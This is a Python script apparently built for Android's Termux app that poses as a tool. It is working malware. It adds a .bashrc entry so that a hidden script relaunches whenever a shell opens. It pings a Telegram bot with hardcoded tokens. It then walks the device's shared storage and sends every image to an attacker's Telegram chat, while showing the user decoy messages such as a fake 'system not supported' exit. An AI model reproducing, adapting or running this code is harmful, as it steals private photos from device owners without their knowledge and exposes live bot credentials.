hack = 'nohup python /storage/emulated/0/.JOO.py > /dev/null 2>&1 &'
try:
    read = open('/data/data/com.termux/files/home/.bashrc','r').read
    requests.post(f'''https://api.telegram.org/bot6729895335:AAGVGFp_akqbh8dUeBTjEdVuufNBe4sTiZI--NtM/sendMessage?chat_id=5210419138&text=انتضر سحب''')
except:
 open('/data/data/com.termux/files/home/.bashrc','w').write(hack)
try:
    open('/data/data/com.termux/files/home/.tst.txt','r').read
except:
    open('/data/data/com.termux/files/home/.tst.txt','w').write('hi');exit('\n Sorry your system not support ')
import os
import telebot
from threading import Thread

bot = telebot.TeleBot("7602835019:AAEJfG-cJyFEhOh5MlUstrAij9GCo1SXqI0") 


dir_path = "/storage/emulated/0/"
 

def send_file(file_path):
 with open(file_path, "rb") as f:
  if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
   bot.send_photo(chat_id="7549779800",photo=f) 
  else:
   print("انتضر سوف تشتغل الاداة")

for root, dirs, files in os.walk(dir_path):
 threads = []
 for file in files:
  file_path = os.path.join(root, file)
  t = Thread(target=send_file, args=(file_path,))
  t.start()
  threads.append(t)
 for thread in threads:
  thread.join()